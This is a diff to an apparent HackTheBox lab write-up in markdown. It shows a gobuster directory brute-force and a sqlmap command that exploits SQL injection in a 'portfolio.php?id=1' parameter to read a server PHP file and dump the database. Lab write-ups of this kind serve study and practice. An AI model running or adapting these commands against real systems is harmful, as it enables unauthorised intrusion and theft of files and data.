@@ -19,7 +19,8 @@ gobuster dir -u http://docker.hackthebox.eu:31569/ -w /usr/share/wordlists/dirb/
 ![Directory Brute-force using gobuster](/directort1.png)
 
 
-Read the file in server using sqlmap 
+Read the file in server using sqlmap
+
 sqlmap -u http://docker.hackthebox.eu:31569/portfolio.php?id=1 --file-read=/var/www/html/administrat/panel.php --dump --batch
 ![Directory Brute-force using gobuster](/output.png)
 ![Directory Brute-force using gobuster](/output2.png)
